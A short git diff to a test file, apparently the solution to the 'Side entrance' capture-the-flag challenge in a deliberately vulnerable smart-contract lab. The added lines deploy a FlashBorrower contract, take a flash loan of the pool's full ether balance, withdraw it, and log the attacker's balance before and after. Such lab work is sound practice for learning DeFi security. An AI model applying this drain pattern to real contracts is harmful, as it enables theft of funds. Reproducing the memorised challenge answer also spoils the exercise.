@@ -25,6 +25,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log(`ATTACKER'S BALANCE ${this.attackerInitialEthBalance}`);
+        const borrowerFactory = await ethers.getContractFactory('FlashBorrower');
+        const borrower = await borrowerFactory.deploy(this.pool.address, attacker.address);
+        await borrower.startFlashLoan(ETHER_IN_POOL);
+        await borrower.withdraw();
+        console.log(`ATTACKER'S BALANCE ${await ethers.provider.getBalance(attacker.address)}`);
     });
 
     after(async function () {
